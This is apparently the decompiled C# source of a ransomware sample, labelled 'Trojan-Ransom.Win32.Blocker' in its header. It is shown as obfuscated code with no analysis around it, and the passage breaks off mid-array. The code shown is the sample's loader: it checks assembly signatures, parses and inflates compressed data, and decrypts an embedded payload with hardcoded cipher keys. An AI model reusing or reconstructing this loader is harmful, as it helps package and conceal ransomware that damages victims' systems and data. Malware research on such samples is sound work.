// Decompiled with JetBrains decompiler
// Type: .
// Assembly: BOMBS, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b01670ee6fa4859f
// MVID: D5D8F5B0-12EB-4325-8C3D-C60F341D062A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.jjta-28a226e15e1e7b94528e46718041b3f49976b446eb3daccd652d0e5b43f948be.exe

using \u0001;
using \u0002;
using \u0004;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace \u0004
{
  internal sealed class \u0003
  {
    public static string \u0001;

    private static bool \u0001([In] Assembly obj0, [In] Assembly obj1)
    {
      byte[] publicKey1;
      bool flag;
      byte[] publicKey2;
      int index;
      try
      {
        int num1;
        do
        {
          publicKey1 = obj0.GetName().GetPublicKey();
label_2:
          if (false)
            goto label_16;
          else
            goto label_17;
label_5:
          if (publicKey2 != null)
          {
            index = 0;
            goto label_15;
          }
          else
            goto label_16;
label_8:
          if (true)
          {
            int num2 = (int) publicKey1[index];
            if (num1 != num2)
              continue;
            if (true)
              ++index;
            else
              goto label_2;
          }
          else
            goto label_12;
label_15:
          if (index < publicKey2.Length)
          {
            num1 = (int) publicKey2[index];
            goto label_8;
          }
label_16:
          flag = true;
          if (false)
            goto label_5;
          else
            goto label_19;
label_17:
          publicKey2 = obj1.GetName().GetPublicKey();
          int num3 = publicKey2 == null ? 1 : 0;
          if (true)
          {
            int num4 = publicKey1 == null ? 1 : 0;
            if (num3 != num4)
            {
              flag = false;
              goto label_19;
            }
            else
              goto label_5;
          }
          else
          {
            num1 = num3;
            goto label_8;
          }
        }
        while (false);
        num1 = 0;
label_12:
        flag = num1 != 0;
      }
      catch (Exception ex)
      {
        byte[] numArray1 = publicKey1;
        byte[] numArray2 = publicKey2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) index;
        Assembly assembly1 = obj0;
        Assembly assembly2 = obj1;
        \u0003.\u0001(ex, (object) numArray1, (object) numArray2, (object) local, (object) assembly1, (object) assembly2);
        throw;
      }
label_19:
      return flag;
    }

    public static byte[] \u0001([In] byte[] obj0)
    {
      byte[] numArray1;
      \u0003.\u000F obj1;
      byte[] numArray2;
      int num1;
      short num2;
      int num3;
      int num4;
      int length1;
      int count1;
      int count2;
      byte[] buffer1;
      byte[] buffer2;
      byte[] buffer3;
      \u0003.\u0001 obj2;
      int num5;
      int length2;
      int num6;
      int length3;
      int num7;
      byte[] buffer4;
      \u0003.\u0001 obj3;
      byte[] numArray3;
      byte[] numArray4;
      \u0002.\u0002 obj4;
      ICryptoTransform cryptoTransform1;
      byte[] numArray5;
      byte[] numArray6;
      byte[] numArray7;
      \u0005.\u0001 obj5;
      ICryptoTransform cryptoTransform2;
      byte[] numArray8;
      Assembly assembly;
      Assembly executingAssembly;
      try
      {
        Assembly callingAssembly = Assembly.GetCallingAssembly();
        if (true)
          assembly = callingAssembly;
        executingAssembly = Assembly.GetExecutingAssembly();
        if ((object) assembly != (object) executingAssembly && !\u0003.\u0001(executingAssembly, assembly))
        {
          numArray1 = (byte[]) null;
        }
        else
        {
          obj1 = new \u0003.\u000F(obj0);
          int length4 = 0;
          if (length4 == 0)
          {
            numArray2 = new byte[length4];
            num1 = obj1.\u0002();
            int num8;
            int num9;
            int length5;
            if (num1 == 67324752)
            {
              num2 = (short) obj1.\u0001();
              num3 = obj1.\u0001();
              num4 = obj1.\u0001();
              if (num1 == 67324752)
              {
                int num10 = (int) num2;
                int num11 = 20;
                if (num11 != 0)
                {
                  if (num10 == num11 && num3 == 0 && num4 == 8)
                  {
                    obj1.\u0002();
                    obj1.\u0002();
                    obj1.\u0002();
                    length1 = obj1.\u0002();
                    count1 = obj1.\u0001();
                    count2 = obj1.\u0001();
                    if (count1 > 0)
                    {
                      buffer1 = new byte[count1];
                      if (true)
                        obj1.Read(buffer1, 0, count1);
                      else
                        goto label_54;
                    }
                    if (count2 > 0)
                    {
                      if (true)
                      {
                        buffer2 = new byte[count2];
                        obj1.Read(buffer2, 0, count2);
                      }
                      else
                        goto label_24;
                    }
                    long length6 = obj1.Length;
                    if (true)
                    {
                      long position = obj1.Position;
                      length6 -= position;
                    }
                    buffer3 = new byte[length6];
                    int num12 = obj1.Read(buffer3, 0, buffer3.Length);
                    if (true)
                    {
                      obj2 = new \u0003.\u0001(buffer3);
                      numArray2 = new byte[length1];
                      length4 = obj2.\u0001(numArray2, 0, numArray2.Length);
                      goto label_18;
                    }
                    else
                    {
                      length5 = num12;
                      goto label_40;
                    }
                  }
                }
                else
                {
                  num9 = num11;
                  num8 = num10;
                  goto label_28;
                }
              }
              throw new FormatException("Wrong Header Signature");
            }
            num5 = num1 >> 24;
            num1 -= num5 << 24;
label_20:
            if (num1 != 8223355)
              throw new FormatException("Unknown Header");
            if (num5 == 1)
            {
              length2 = obj1.\u0002();
              numArray2 = new byte[length2];
              num6 = 0;
              goto label_25;
            }
            else
              goto label_26;
label_24:
            obj3.\u0001(numArray2, num6, num7);
            num6 += num7;
label_25:
            if (num6 < length2)
            {
              length3 = obj1.\u0002();
              num7 = obj1.\u0002();
              buffer4 = new byte[length3];
              obj1.Read(buffer4, 0, buffer4.Length);
              obj3 = new \u0003.\u0001(buffer4);
              goto label_24;
            }
label_26:
            if (true)
            {
              num8 = num5;
              num9 = 2;
            }
            else
              goto label_20;
label_28:
            if (num8 == num9)
            {
              numArray3 = new byte[8]
              {
                (byte) 129,
                (byte) 236,
                (byte) 123,
                (byte) 136,
                (byte) 194,
                (byte) 86,
                (byte) 188,
                (byte) 16
              };
              numArray4 = new byte[8]
              {
                (byte) 30,
                (byte) 104,
                (byte) 161,
                (byte) 2,
                (byte) 153,
                (byte) 16,
                (byte) 19,
                (byte) 242
              };
              obj4 = new \u0002.\u0002();
              try
              {
                cryptoTransform1 = obj4.\u0001(numArray3, numArray4, true);
                try
                {
                  numArray5 = cryptoTransform1.TransformFinalBlock(obj0, 4, obj0.Length - 4);
                  numArray2 = \u0003.\u0001(numArray5);
                }
                finally
                {
                  cryptoTransform1?.Dispose();
                }
              }
              finally
              {
                obj4?.Dispose();
              }
            }
            if (num5 == 3)
            {
              numArray6 = new byte[16]
              {
                (byte) 1,
                (byte) 1,
                (byte) 1,
                (byte) 1,
                (byte) 1,
                (byte) 1,
                (byte) 1,
                (byte) 1,
                (byte) 1,
                (byte) 1,
                (byte) 1,
                (byte) 1,
                (byte) 1,
                (byte) 1,
                (byte) 1,
                (byte) 1
              };
              length5 = 16;
            }
            else
              goto label_50;
label_40:
            byte[] numArray9 = new byte[length5];
            // ISSUE: field reference
            RuntimeHelpers.InitializeArray((Array) numArray9, __fieldref (\u0003.\u0001));
            numArray7 = numArray9;
            obj5 = new \u0005.\u0001();
            try
            {
              cryptoTransform2 = obj5.\u0001(numArray6, numArray7, true);
              try
              {
                numArray8 = cryptoTransform2.TransformFinalBlock(obj0, 4, obj0.Length - 4);
                numArray2 = \u0003.\u0001(numArray8);
                goto label_50;
              }
              finally
              {
                cryptoTransform2?.Dispose();
              }
            }
            finally
            {
              obj5?.Dispose();
            }
          }
label_18:
          buffer3 = (byte[]) null;
label_50:
          obj1.Close();
          numArray1 = numArray2;
        }
      }
      catch (Exception ex)
      {
        object[] objArray = new object[33]
        {
          (object) assembly,
          (object) executingAssembly,
          (object) obj1,
          (object) numArray2,
          (object) num1,
          (object) num2,
          (object) num3,
          (object) num4,
          (object) length1,
          (object) count1,
          (object) count2,
          (object) buffer1,
          (object) buffer2,
          (object) buffer3,
          (object) obj2,
          (object) num5,
          (object) length2,
          (object) num6,
          (object) length3,
          (object) num7,
          (object) obj3,
          (object) buffer4,
          (object) numArray3,
          (object) numArray4,
          (object) obj4,
          (object) cryptoTransform1,
          (object) numArray5,
          (object) numArray6,
          (object) numArray7,
          (object) obj5,
          (object) cryptoTransform2,
          (object) numArray8,
          (object) obj0
        };
        \u0003.\u0001(ex, objArray);
        throw;
      }
label_54:
      return numArray1;
    }

    public static byte[] \u0002([In] byte[] obj0)
    {
      byte[] numArray1;
      try
      {
        numArray1 = \u0003.\u0001(obj0, 1, (byte[]) null, (byte[]) null);
      }
      catch (Exception ex)
      {
        byte[] numArray2 = obj0;
        \u0003.\u0001(ex, (object) numArray2);
        throw;
      }
      return numArray1;
    }

    private static byte[] \u0001([In] byte[] obj0, [In] int obj1, [In] byte[] obj2, [In] byte[] obj3)
    {
      DateTime now;
      long num1;
      uint[] numArray1;
      uint maxValue;
      uint num2;
      int num3;
      int num4;
      \u0003.\u000F obj4;
      long position1;
      byte[] bytes;
      \u0003.\u0006 obj5;
      byte[] buffer1;
      int count1;
      byte[] buffer2;
      int count2;
      long num5;
      int srcOffset;
      byte[] dst;
      long position2;
      \u0003.\u0006 obj6;
      byte[] buffer3;
      int count3;
      byte[] buffer4;
      int count4;
      long position3;
      byte[] inputBuffer1;
      \u0002.\u0002 obj7;
      ICryptoTransform cryptoTransform1;
      byte[] buffer5;
      byte[] inputBuffer2;
      \u0005.\u0001 obj8;
      ICryptoTransform cryptoTransform2;
      byte[] buffer6;
      try
      {
        byte[] array;
        try
        {
          obj4 = new \u0003.\u000F();
          switch (obj1)
          {
            case 0:
              obj5 = new \u0003.\u0006();
              if (true)
              {
                now = DateTime.Now;
                int num6 = (now.Year - 1980 & (int) sbyte.MaxValue) << 25 | now.Month << 21 | now.Day << 16 | now.Hour << 11;
                int num7 = now.Minute;
                if (true)
                {
                  int num8 = num7 << 5;
                  int num9 = num6 | num8 | (int) ((uint) now.Second >> 1);
                  while (true)
                  {
                    num1 = (long) (uint) num9;
                    numArray1 = new uint[256]
                    {
                      0U,
                      1996959894U,
                      3993919788U,
                      2567524794U,
                      124634137U,
                      1886057615U,
                      3915621685U,
                      2657392035U,
                      249268274U,
                      2044508324U,
                      3772115230U,
                      2547177864U,
                      162941995U,
                      2125561021U,
                      3887607047U,
                      2428444049U,
                      498536548U,
                      1789927666U,
                      4089016648U,
                      2227061214U,
                      450548861U,
                      1843258603U,
                      4107580753U,
                      2211677639U,
                      325883990U,
                      1684777152U,
                      4251122042U,
                      2321926636U,
                      335633487U,
                      1661365465U,
                      4195302755U,
                      2366115317U,
                      997073096U,
                      1281953886U,
                      3579855332U,
                      2724688242U,
                      1006888145U,
                      1258607687U,
                      3524101629U,
                      2768942443U,
                      901097722U,
                      1119000684U,
                      3686517206U,
                      2898065728U,
                      853044451U,
                      1172266101U,
                      3705015759U,
                      2882616665U,
                      651767980U,
                      1373503546U,
                      3369554304U,
                      3218104598U,
                      565507253U,
                      1454621731U,
                      3485111705U,
                      3099436303U,
                      671266974U,
                      1594198024U,
                      3322730930U,
                      2970347812U,
                      795835527U,
                      1483230225U,
                      3244367275U,
                      3060149565U,
                      1994146192U,
                      31158534U,
                      2563907772U,
                      4023717930U,
                      1907459465U,
                      112637215U,
                      2680153253U,
                      3904427059U,
                      2013776290U,
                      251722036U,
                      2517215374U,
                      3775830040U,
                      2137656763U,
                      141376813U,
                      2439277719U,
                      3865271297U,
                      1802195444U,
                      476864866U,
                      2238001368U,
                      4066508878U,
                      1812370925U,
                      453092731U,
                      2181625025U,
                      4111451223U,
                      1706088902U,
                      314042704U,
                      2344532202U,
                      4240017532U,
                      1658658271U,
                      366619977U,
                      2362670323U,
                      4224994405U,
                      1303535960U,
                      984961486U,
                      2747007092U,
                      3569037538U,
                      1256170817U,
                      1037604311U,
                      2765210733U,
                      3554079995U,
                      1131014506U,
                      879679996U,
                      2909243462U,
                      3663771856U,
                      1141124467U,
                      855842277U,
                      2852801631U,
                      3708648649U,
                      1342533948U,
                      654459306U,
                      3188396048U,
                      3373015174U,
                      1466479909U,
                      544179635U,
                      3110523913U,
                      3462522015U,
                      1591671054U,
                      702138776U,
                      2966460450U,
                      3352799412U,
                      1504918807U,
                      783551873U,
                      3082640443U,
                      3233442989U,
                      3988292384U,
                      2596254646U,
                      62317068U,
                      1957810842U,
                      3939845945U,
                      2647816111U,
                      81470997U,
                      1943803523U,
                      3814918930U,
                      2489596804U,
                      225274430U,
                      2053790376U,
                      3826175755U,
                      2466906013U,
                      167816743U,
                      2097651377U,
                      4027552580U,
                      2265490386U,
                      503444072U,
                      1762050814U,
                      4150417245U,
                      2154129355U,
                      426522225U,
                      1852507879U,
                      4275313526U,
                      2312317920U,
                      282753626U,
                      1742555852U,
                      4189708143U,
                      2394877945U,
                      397917763U,
                      1622183637U,
                      3604390888U,
                      2714866558U,
                      953729732U,
                      1340076626U,
                      3518719985U,
                      2797360999U,
                      1068828381U,
                      1219638859U,
                      3624741850U,
                      2936675148U,
                      906185462U,
                      1090812512U,
                      3747672003U,
                      2825379669U,
                      829329135U,
                      1181335161U,
                      3412177804U,
                      3160834842U,
                      628085408U,
                      1382605366U,
                      3423369109U,
                      3138078467U,
                      570562233U,
                      1426400815U,
                      3317316542U,
                      2998733608U,
                      733239954U,
                      1555261956U,
                      3268935591U,
                      3050360625U,
                      752459403U,
                      1541320221U,
                      2607071920U,
                      3965973030U,
                      1969922972U,
                      40735498U,
                      2617837225U,
                      3943577151U,
                      1913087877U,
                      83908371U,
                      2512341634U,
                      3803740692U,
                      2075208622U,
                      213261112U,
                      2463272603U,
                      3855990285U,
                      2094854071U,
                      198958881U,
                      2262029012U,
                      4057260610U,
                      1759359992U,
                      534414190U,
                      2176718541U,
                      4139329115U,
                      1873836001U,
                      414664567U,
                      2282248934U,
                      4279200368U,
                      1711684554U,
                      285281116U,
                      2405801727U,
                      4167216745U,
                      1634467795U,
                      376229701U,
                      2685067896U,
                      3608007406U,
                      1308918612U,
                      956543938U,
                      2808555105U,
                      3495958263U,
                      1231636301U,
                      1047427035U,
                      2932959818U,
                      3654703836U,
                      1088359270U,
                      936918000U,
                      2847714899U,
                      3736837829U,
                      1202900863U,
                      817233897U,
                      3183342108U,
                      3401237130U,
                      1404277552U,
                      615818150U,
                      3134207493U,
                      3453421203U,
                      1423857449U,
                      601450431U,
                      3009837614U,
                      3294710456U,
                      1567103746U,
                      711928724U,
                      3020668471U,
                      3272380065U,
                      1510334235U,
                      755167117U
                    };
                    maxValue = uint.MaxValue;
                    num2 = maxValue;
                    num3 = 0;
                    num4 = obj0.Length;
                    int num10;
                    while (true)
                    {
                      num10 = num4;
                      if (true)
                      {
                        if ((num4 = num10 - 1) >= 0)
                        {
                          if (true)
                            num2 = numArray1[(IntPtr) (uint) (((int) num2 ^ (int) obj0[num3++]) & (int) byte.MaxValue)] ^ num2 >> 8;
                          else
                            goto label_32;
                        }
                        else
                          goto label_7;
                      }
                      else
                        break;
                    }
                    num9 = num10;
                  }
label_7:
                  num2 ^= maxValue;
                  obj4.\u0002(67324752);
                  obj4.\u0001(20);
                  obj4.\u0001(0);
                  obj4.\u0001(8);
                  obj4.\u0002((int) num1);
                  obj4.\u0002((int) num2);
                  position1 = obj4.Position;
                  obj4.\u0002(0);
                  obj4.\u0002(obj0.Length);
                  bytes = Encoding.UTF8.GetBytes("{data}");
                  obj4.\u0001(bytes.Length);
                  obj4.\u0001(0);
                  obj4.Write(bytes, 0, bytes.Length);
                  obj5.\u0001(obj0);
                  goto label_11;
                }
label_9:
                if (num6 > num7)
                  obj4.Write(buffer1, 0, count1);
                else
                  goto label_12;
label_11:
                if (!obj5.\u0002())
                {
                  buffer1 = new byte[512];
                  count1 = obj5.\u0001(buffer1);
                  int num11 = count1;
                  num7 = 0;
                  num6 = num11;
                  goto label_9;
                }
label_12:
                obj5.\u0001();
                while (!obj5.\u0001())
                {
                  buffer2 = new byte[512];
                  count2 = obj5.\u0001(buffer2);
                  if (count2 > 0)
                    obj4.Write(buffer2, 0, count2);
                  else
                    break;
                }
                num5 = obj5.\u0001();
                obj4.\u0002(33639248);
                obj4.\u0001(20);
                obj4.\u0001(20);
                obj4.\u0001(0);
                obj4.\u0001(8);
                obj4.\u0002((int) num1);
                obj4.\u0002((int) num2);
                obj4.\u0002((int) num5);
                obj4.\u0002(obj0.Length);
                obj4.\u0001(bytes.Length);
                obj4.\u0001(0);
                obj4.\u0001(0);
                obj4.\u0001(0);
                if (true)
                {
                  obj4.\u0001(0);
                  obj4.\u0002(0);
                  obj4.\u0002(0);
                  obj4.Write(bytes, 0, bytes.Length);
                  obj4.\u0002(101010256);
                  obj4.\u0001(0);
                  obj4.\u0001(0);
                  obj4.\u0001(1);
                  obj4.\u0001(1);
                  obj4.\u0002(46 + bytes.Length);
                  if (true)
                  {
                    obj4.\u0002((int) ((long) (30 + bytes.Length) + num5));
                    obj4.\u0001(0);
                    obj4.Seek(position1, SeekOrigin.Begin);
                    obj4.\u0002((int) num5);
                    goto default;
                  }
                  else
                    break;
                }
                else
                  goto label_44;
              }
              else
                goto label_29;
            case 1:
              obj4.\u0002(25000571);
              if (true)
              {
                obj4.\u0002(obj0.Length);
                srcOffset = 0;
                goto label_33;
              }
              else
                goto label_31;
            case 2:
              obj4.\u0002(41777787);
              inputBuffer1 = \u0003.\u0001(obj0, 1, (byte[]) null, (byte[]) null);
              obj7 = new \u0002.\u0002();
              try
              {
                cryptoTransform1 = obj7.\u0001(obj2, obj3, false);
                try
                {
                  buffer5 = cryptoTransform1.TransformFinalBlock(inputBuffer1, 0, inputBuffer1.Length);
                  obj4.Write(buffer5, 0, buffer5.Length);
                  goto default;
                }
                finally
                {
                  cryptoTransform1?.Dispose();
                }
              }
              finally
              {
                obj7?.Dispose();
              }
            case 3:
              obj4.\u0002(58555003);
              inputBuffer2 = \u0003.\u0001(obj0, 1, (byte[]) null, (byte[]) null);
              goto label_44;
            default:
label_53:
              obj4.Flush();
              obj4.Close();
              array = obj4.ToArray();
              goto label_57;
          }
label_22:
          obj6 = new \u0003.\u0006();
          obj6.\u0001(dst);
          while (!obj6.\u0002())
          {
            buffer3 = new byte[512];
            count3 = obj6.\u0001(buffer3);
            if (count3 > 0)
              obj4.Write(buffer3, 0, count3);
            else
              break;
          }
          obj6.\u0001();
label_29:
          while (!obj6.\u0001())
          {
            buffer4 = new byte[512];
            count4 = obj6.\u0001(buffer4);
            if (count4 > 0)
              obj4.Write(buffer4, 0, count4);
            else
              break;
          }
          position3 = obj4.Position;
label_31:
          obj4.Position = position2;
          obj4.\u0002((int) obj6.\u0001());
label_32:
          obj4.Position = position3;
          srcOffset += dst.Length;
label_33:
          if (srcOffset < obj0.Length)
          {
            dst = new byte[Math.Min(2097151, obj0.Length - srcOffset)];
            Buffer.BlockCopy((Array) obj0, srcOffset, (Array) dst, 0, dst.Length);
            position2 = obj4.Position;
            obj4.\u0002(0);
            obj4.\u0002(dst.Length);
            goto label_22;
          }
          else
            goto label_53;
label_44:
          obj8 = new \u0005.\u0001();
          try
          {
            cryptoTransform2 = obj8.\u0001(obj2, obj3, false);
            try
            {
              buffer6 = cryptoTransform2.TransformFinalBlock(inputBuffer2, 0, inputBuffer2.Length);
              obj4.Write(buffer6, 0, buffer6.Length);
              goto label_53;
            }
            finally
            {
              cryptoTransform2?.Dispose();
            }
          }
          finally
          {
            obj8?.Dispose();
          }
        }
        catch (Exception ex)
        {
          \u0003.\u0001 = "ERR 2003: " + ex.Message;
          throw;
        }
label_57:
        return array;
      }
      catch (Exception ex)
      {
        byte[] numArray2;
        object[] objArray = new object[39]
        {
          (object) obj4,
          (object) obj5,
          (object) now,
          (object) num1,
          (object) numArray1,
          (object) maxValue,
          (object) num2,
          (object) num3,
          (object) num4,
          (object) position1,
          (object) bytes,
          (object) buffer1,
          (object) count1,
          (object) buffer2,
          (object) count2,
          (object) num5,
          (object) srcOffset,
          (object) dst,
          (object) position2,
          (object) obj6,
          (object) buffer3,
          (object) count3,
          (object) buffer4,
          (object) count4,
          (object) position3,
          (object) inputBuffer1,
          (object) obj7,
          (object) cryptoTransform1,
          (object) buffer5,
          (object) inputBuffer2,
          (object) obj8,
          (object) cryptoTransform2,
          (object) buffer6,
          (object) ex,
          (object) numArray2,
          (object) obj0,
          (object) obj1,
          (object) obj2,
          (object) obj3
        };
        \u0003.\u0001(ex, objArray);
        throw;
      }
    }

    internal sealed class \u0001
    {
      private static readonly int[] \u0001;
      private static readonly int[] \u0002;
      private static readonly int[] \u0003;
      private static readonly int[] \u0004;
      private int \u0001;
      private int \u0002;
      private int \u0003;
      private int \u0004;
      private int \u0005;
      private bool \u0001;
      private \u0003.\u0002 \u0001;
      private \u0003.\u0003 \u0001;
      private \u0003.\u0005 \u0001;
      private \u0003.\u0004 \u0001;
      private \u0003.\u0004 \u0002;

      public \u0001([In] byte[] obj0)
      {
        try
        {
          this.\u0001 = new \u0003.\u0002();
          this.\u0001 = new \u0003.\u0003();
          this.\u0001 = 2;
          this.\u0001.\u0001(obj0, 0, obj0.Length);
        }
        catch (Exception ex)
        {
          byte[] numArray = obj0;
          \u0003.\u0001(ex, (object) this, (object) numArray);
          throw;
        }
      }

      private bool \u0001()
      {
        int num1;
        int index1;
        int num2;
        int num3;
        int num4;
        try
        {
          num1 = this.\u0001.\u0001();
          int num5;
          while (true)
          {
            int num6 = num1;
            int num7 = 258;
            if (num7 != 0)
              goto label_32;
label_1:
            switch (num6 - num7)
            {
              case 0:
                do
                {
                  int num8;
                  index1 = num8 = this.\u0001.\u0001(this.\u0001);
                  int num9;
                  for (int index2 = -256; (num8 & index2) != 0; num8 = num9)
                  {
                    if (index1 < 257)
                    {
                      num9 = index1;
                      int num10 = 0;
                      if (num10 != 0)
                      {
                        index2 = num10;
                      }
                      else
                      {
                        if (num9 < num10)
                          return false;
                        this.\u0002 = (\u0003.\u0004) null;
                        this.\u0001 = (\u0003.\u0004) null;
                        this.\u0001 = 2;
                        return true;
                      }
                    }
                    else
                    {
                      this.\u0003 = \u0003.\u0001.\u0001[index1 - 257];
                      this.\u0002 = \u0003.\u0001.\u0002[index1 - 257];
                      goto case 1;
                    }
                  }
                  this.\u0001.\u0001(index1);
                }
                while (--num1 >= 258);
                goto label_2;
              case 1:
                if (this.\u0002 > 0)
                {
                  this.\u0001 = 8;
                  num2 = this.\u0001.\u0001(this.\u0002);
                  num5 = num2;
                  if (true)
                  {
                    if (num5 < 0)
                    {
                      if (false)
                        goto case 0;
                      else
                        goto label_15;
                    }
                    else
                    {
                      this.\u0001.\u0001(this.\u0002);
                      this.\u0003 += num2;
                    }
                  }
                  else
                    goto label_38;
                }
                this.\u0001 = 9;
                goto case 2;
              case 2:
                index1 = this.\u0002.\u0001(this.\u0001);
                if (index1 >= 0)
                {
                  this.\u0004 = \u0003.\u0001.\u0003[index1];
                  this.\u0002 = \u0003.\u0001.\u0004[index1];
                  goto case 3;
                }
                else
                  goto label_19;
              case 3:
                if (true)
                {
                  if (this.\u0002 > 0)
                  {
                    this.\u0001 = 10;
                    num3 = this.\u0001.\u0001(this.\u0002);
                    if (num3 >= 0)
                      this.\u0001.\u0001(this.\u0002);
                    else
                      goto label_25;
                  }
                  else
                    goto label_28;
                }
                this.\u0004 += num3;
label_28:
                this.\u0001.\u0001(this.\u0003, this.\u0004);
                if (true)
                {
                  num1 -= this.\u0003;
                  if (true)
                  {
                    this.\u0001 = 7;
                    continue;
                  }
                  goto label_35;
                }
                else
                  goto case 1;
              default:
                continue;
            }
label_32:
            if (num6 >= num7)
              num4 = this.\u0001;
            else
              goto label_33;
label_35:
            int num11 = num4;
            num7 = 7;
            num6 = num11;
            goto label_1;
          }
label_2:
          return true;
label_15:
          return false;
label_19:
          int num12 = 0;
label_20:
          return num12 != 0;
label_38:
          num12 = num5;
          goto label_20;
label_25:
          return false;
label_33:
          return true;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) index1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> local5 = (ValueType) num4;
          \u0003.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) this);
          throw;
        }
      }

      private bool \u0002()
      {
        int num1;
        bool flag;
        int num2;
        int num3;
        int num4;
        try
        {
          num2 = this.\u0001;
          int num5 = num2 - 2;
          int num6;
          while (true)
          {
            switch (num5)
            {
              case 0:
                if (!this.\u0001)
                {
                  num1 = this.\u0001.\u0001(3);
                  if (num1 >= 0)
                  {
                    this.\u0001.\u0001(3);
                    num6 = num1;
                    if (false)
                    {
                      num5 = num6;
                      continue;
                    }
                    goto label_5;
                  }
                  else
                    goto label_3;
                }
                else
                  goto label_34;
              case 1:
                goto label_14;
              case 2:
                goto label_17;
              case 3:
                goto label_21;
              case 4:
                goto label_25;
              case 5:
              case 6:
              case 7:
              case 8:
                goto label_29;
              case 10:
                goto label_30;
              default:
                goto label_31;
            }
          }
label_3:
          flag = false;
          goto label_38;
label_5:
          int num7 = num6 & 1;
label_6:
          if (num7 != 0)
            this.\u0001 = true;
          num2 = num1 >> 1;
          int num8 = num2;
          if (true)
          {
            switch (num8)
            {
              case 0:
                this.\u0001.\u0001();
                this.\u0001 = 3;
                break;
              case 1:
                this.\u0001 = \u0003.\u0004.\u0001;
                this.\u0002 = \u0003.\u0004.\u0002;
                this.\u0001 = 7;
                break;
              case 2:
                this.\u0001 = new \u0003.\u0005();
                this.\u0001 = 6;
                break;
            }
          }
          else
            goto label_35;
label_13:
          flag = true;
          goto label_38;
label_14:
          this.\u0005 = num2 = this.\u0001.\u0001(16);
          if (num2 < 0)
          {
            flag = false;
            goto label_38;
          }
          else
          {
            this.\u0001.\u0001(16);
            this.\u0001 = 4;
          }
label_17:
          num3 = this.\u0001.\u0001(16);
          if (true)
          {
            if (num3 < 0)
            {
              flag = false;
              goto label_38;
            }
            else
            {
              this.\u0001.\u0001(16);
              this.\u0001 = 5;
            }
          }
          else
            goto label_14;
label_21:
          num4 = this.\u0001.\u0001(this.\u0001, this.\u0005);
          this.\u0005 -= num4;
          if (this.\u0005 == 0)
          {
            this.\u0001 = 2;
            int num9 = 1;
            if (num9 == 0)
            {
              num7 = num9;
              goto label_6;
            }
            else
            {
              flag = num9 != 0;
              goto label_38;
            }
          }
          else
          {
            flag = !this.\u0001.\u0001();
            goto label_38;
          }
label_25:
          if (!this.\u0001.\u0001(this.\u0001))
          {
            flag = false;
            goto label_38;
          }
          else
          {
            this.\u0001 = this.\u0001.\u0001();
            this.\u0002 = this.\u0001.\u0002();
            if (true)
              this.\u0001 = 7;
            else
              goto label_13;
          }
label_29:
          flag = this.\u0001();
          if (false)
            goto label_13;
          else
            goto label_38;
label_30:
          flag = false;
          goto label_38;
label_31:
          flag = false;
          if (false)
            goto label_3;
          else
            goto label_38;
label_34:
          this.\u0001 = 12;
          num8 = 0;
label_35:
          flag = num8 != 0;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) num2;
          \u0003.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) this);
          throw;
        }
label_38:
        return flag;
      }

      public int \u0001([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        int num1;
        int num2;
        int num3;
        try
        {
          int num4 = 0;
          while (true)
          {
            num2 = num4;
label_19:
            int num5 = this.\u0001;
            int num6;
            while (true)
            {
              if (num5 == 11)
                goto label_10;
              else
                goto label_20;
label_6:
              int num7;
              int num8;
              num6 = num7 + num8;
              if (true)
              {
                num2 = num6;
                obj2 -= num1;
              }
              else
                break;
label_8:
              if (obj2 == 0)
                goto label_9;
label_10:
              int num9 = this.\u0002() ? 1 : 0;
              if (false)
              {
                num5 = num9;
                continue;
              }
              int num10;
              if (num9 == 0)
              {
                num7 = this.\u0001.\u0002();
                num8 = 0;
                if (num8 == 0)
                {
                  if (num7 > num8)
                    num10 = this.\u0001;
                  else
                    goto label_16;
                }
                else
                  goto label_6;
              }
              else
                goto label_19;
label_15:
              if (num10 != 11)
                goto label_19;
label_16:
              num3 = num2;
              if (false)
                goto label_8;
              else
                goto label_23;
label_20:
              int num11 = this.\u0001.\u0001(obj0, obj1, obj2);
              int num12;
              while (true)
              {
                num1 = num11;
                num12 = obj1 + num1;
                if (true)
                {
                  if (false)
                    num11 = num12;
                  else
                    break;
                }
                else
                  goto label_1;
              }
              obj1 = num12;
              int num13 = num2;
              num8 = num1;
              num7 = num13;
              goto label_6;
label_1:
              num10 = num12;
              goto label_15;
            }
            num4 = num6;
          }
label_9:
          num3 = num2;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) num1;
          byte[] numArray = obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) obj2;
          \u0003.\u0001(ex, (object) local1, (object) local2, (object) this, (object) numArray, (object) local3, (object) local4);
          throw;
        }
label_23:
        return num3;
      }

      static \u0001()
      {
        try
        {
          do
          {
            do
            {
              if (true)
              {
                \u0003.\u0001.\u0001 = new int[29]
                {
                  3,
                  4,
                  5,
                  6,
                  7,
                  8,
                  9,
                  10,
                  11,
                  13,
                  15,
                  17,
                  19,
                  23,
                  27,
                  31,
                  35,
                  43,
                  51,
                  59,
                  67,
                  83,
                  99,
                  115,
                  131,
                  163,
                  195,
                  227,
                  258
                };
                \u0003.\u0001.\u0002 = new int[29]
                {
                  0,
                  0,
                  0,
                  0,
